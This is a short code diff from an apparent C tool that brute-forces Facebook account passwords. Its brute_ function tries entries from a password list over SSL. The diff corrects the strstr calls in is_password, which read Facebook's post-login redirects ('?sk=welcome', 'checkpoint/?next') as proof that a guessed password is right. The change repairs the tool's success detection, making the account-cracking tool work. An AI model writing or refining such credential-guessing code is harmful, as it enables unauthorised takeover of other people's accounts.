@@ -111,9 +111,9 @@ SSL *connect_server() {
     return ssl;
 }
 int is_password(char *data) {
-    if(strstr("Location: https://www.facebook.com/?sk=welcome", data) || strstr("?sk=welcome", data))
+    if(strstr(data, "Location: https://www.facebook.com/?sk=welcome") || strstr(data, "?sk=welcome"))
         return 1;
-    else if(strstr("Location: https://www.facebook.com/checkpoint/?next", data) || strstr("checkpoint/?next", data))
+    else if(strstr(data, "Location: https://www.facebook.com/checkpoint/?next") || strstr(data, "checkpoint/?next"))
         return 1;
     return 0;
 }
@@ -181,7 +181,7 @@ void brute_() {
         SSL_shutdown(ssl);
         SSL_free(ssl);
         CloseSocket(connect_socket);
-        if(is_password(response)) {
+        if(is_password(response) == 1) {
             printf("Password: %s%s%s\n", yellow, PASSWORDS[pos], reset);
             printf("%s", cyan);
             printf("\n[Info]:"); printf("%s", reset);
